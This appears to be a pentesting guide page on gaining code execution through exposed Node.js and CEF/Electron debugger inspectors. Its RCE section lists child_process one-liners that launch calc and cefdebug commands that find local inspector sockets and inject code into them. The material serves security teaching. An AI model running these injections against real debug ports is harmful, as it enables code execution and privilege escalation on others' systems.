# Node/CEF inspector abuse

## Basic Information

When started with the `--inspect` switch, a Node.js process listens for a debugging client. By **default**, it will listen at host and port **`127.0.0.1:9229`**. Each process is also assigned a **unique** **UUID**.

Inspector clients must know and specify host address, port, and UUID to connect. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Since the **debugger has full access to the Node.js execution environment**, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process (**potential privilege escalation**).
{% endhint %}

There are several ways to start an inspector:

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Processes based on **CEF** (Chromium Embedded Framework) like **electron could be vulnerable to privilege escalation** if they **left the inspector activated** in the production version that people is using.

In case of CEF projects, they need to use the param: `--remote-debugging-port=9222`

### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites open in a web-browser can make WebSocket and HTTP requests under the browser security model. An **initial HTTP connection** is necessary to **obtain a unique debugger session id**. The **same-origin-policy** **prevents** websites from being able to make **this HTTP connection**. For additional security against [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js verifies that the **'Host' headers** for the connection either specify an **IP address** or **`localhost`** or **`localhost6`** precisely.

{% hint style="info" %}
This **security measures prevents exploiting the inspector** to run code by **just sending a HTTP request** (which could be done exploiting a SSRF vuln).
{% endhint %}

## RCE

{% hint style="info" %}
If you came here looking how to get [**RCE from a XSS in Electron please check this page.**](../../pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/)****
{% endhint %}

Some common ways to obtain **RCE** when you can **connect** to a Node **inspector** is using something like:

```javascript
process.mainModule.require('child_process').exec('calc')

window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")

require('child_process').spawnSync('calc.exe')

Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```

### Connect to inspector/debugger

If you have access to a **Chromium base browser** you can connect accessing `chrome://inspect` or `edge://inspect` in Edge. Click the Configure button and ensure your **target host and port** are listed.

The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), allows to **find inspectors** running locally and **inject code** into them.

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```



## References

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
